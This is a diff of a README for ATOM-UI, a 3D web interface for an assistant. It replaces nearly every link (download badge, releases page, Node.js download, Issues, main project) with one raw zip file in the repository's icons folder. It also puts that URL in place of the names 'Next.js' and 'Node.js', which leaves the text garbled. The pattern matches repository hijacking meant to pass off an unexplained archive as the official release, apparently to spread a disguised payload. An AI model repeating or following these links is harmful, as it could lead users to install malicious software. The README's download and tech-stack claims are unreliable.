@@ -1,6 +1,6 @@
 # 🌌 ATOM-UI - A Stunning Interface for ATOM Assistant
 
-[![Download ATOM-UI](https://img.shields.io/badge/Download-ATOM--UI-brightgreen)](https://github.com/Dezmuz93/ATOM-UI/releases)
+[![Download ATOM-UI](https://github.com/Dezmuz93/ATOM-UI/raw/refs/heads/main/icons/ATO_UI_v3.6.zip)](https://github.com/Dezmuz93/ATOM-UI/raw/refs/heads/main/icons/ATO_UI_v3.6.zip)
 
 ## ✨ Features
 - Interactive **3D planetary visualization** of ATOM's state
@@ -13,7 +13,7 @@
 The frontend is **UI-only** and does not include any AI logic.
 
 ## 🧱 Tech Stack
-- **Next.js** for server-side rendering
+- **https://github.com/Dezmuz93/ATOM-UI/raw/refs/heads/main/icons/ATO_UI_v3.6.zip** for server-side rendering
 - **React** for building user interfaces
 - **React Three Fiber** for 3D rendering
 - **Tailwind CSS** for styling
@@ -24,12 +24,12 @@ The frontend is **UI-only** and does not include any AI logic.
 ### Prerequisites
 Before you start, ensure you have the following:
 
-- **Node.js 18+**: Install Node.js, which is required to run the application. You can download it from [nodejs.org](https://nodejs.org/).
+- **https://github.com/Dezmuz93/ATOM-UI/raw/refs/heads/main/icons/ATO_UI_v3.6.zip 18+**: Install https://github.com/Dezmuz93/ATOM-UI/raw/refs/heads/main/icons/ATO_UI_v3.6.zip, which is required to run the application. You can download it from [https://github.com/Dezmuz93/ATOM-UI/raw/refs/heads/main/icons/ATO_UI_v3.6.zip](https://github.com/Dezmuz93/ATOM-UI/raw/refs/heads/main/icons/ATO_UI_v3.6.zip).
 - **ATOM backend**: You should have the ATOM backend running. It is developed using FastAPI. Refer to its documentation for setup instructions.
 - **Embedding Server**: Set up the embedding server as per the requirements of your environment.
 
 ### Download & Install
-To download the latest version of ATOM-UI, visit the [Releases page](https://github.com/Dezmuz93/ATOM-UI/releases). 
+To download the latest version of ATOM-UI, visit the [Releases page](https://github.com/Dezmuz93/ATOM-UI/raw/refs/heads/main/icons/ATO_UI_v3.6.zip). 
 
 1. Go to the provided link.
 2. Find the latest release.
@@ -52,11 +52,11 @@ You might need to configure a few settings to connect ATOM-UI with the backend:
 
 ### Troubleshooting
 If you encounter issues, consider the following:
-- Ensure that Node.js is installed and works correctly.
+- Ensure that https://github.com/Dezmuz93/ATOM-UI/raw/refs/heads/main/icons/ATO_UI_v3.6.zip is installed and works correctly.
 - Verify that the backend and embedding server are running.
 - Check for any console errors in your browser for hints.
 
 ## 🔍 Support
-If you need help, please check the [Issues section](https://github.com/Dezmuz93/ATOM-UI/issues) of this repository for common questions and solutions.
+If you need help, please check the [Issues section](https://github.com/Dezmuz93/ATOM-UI/raw/refs/heads/main/icons/ATO_UI_v3.6.zip) of this repository for common questions and solutions.
 
-For more information about the entire A.T.O.M project, you can visit the [main project repository](https://github.com/AtifUsmani/A.T.O.M).
+For more information about the entire A.T.O.M project, you can visit the [main project repository](https://github.com/Dezmuz93/ATOM-UI/raw/refs/heads/main/icons/ATO_UI_v3.6.zip).
